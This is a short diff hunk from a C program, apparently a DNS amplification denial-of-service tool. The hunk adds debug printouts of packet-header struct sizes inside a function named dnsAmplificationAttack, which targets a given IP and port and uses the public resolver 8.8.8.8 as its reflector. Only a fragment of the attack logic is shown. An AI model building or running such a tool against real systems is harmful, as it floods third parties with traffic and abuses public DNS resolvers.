@@ -84,9 +84,17 @@ void queryset(query *q){
 
 void dnsAmplificationAttack(char *targetIp, int targetPort)
 {
+	printf("dnsHeaer size: %d\n", sizeof(dnsHeaer));
+	printf("query size: %d\n", sizeof(query));
+	printf("iph size: %d\n", sizeof(iph));
+	printf("udph size: %d\n", sizeof(udph));
+	printf("eDnsHeader size: %d\n", sizeof(eDnsHeader));
+	printf("psHeader size: %d\n", sizeof(psHeader));
+
+
 	char *dnsIp = "8.8.8.8";
 	int dnsPort = 53;
-	
+		
 	unsigned char dnsRequestPacket[139];
 	unsigned char *dnsRecord = "github.com";
 	
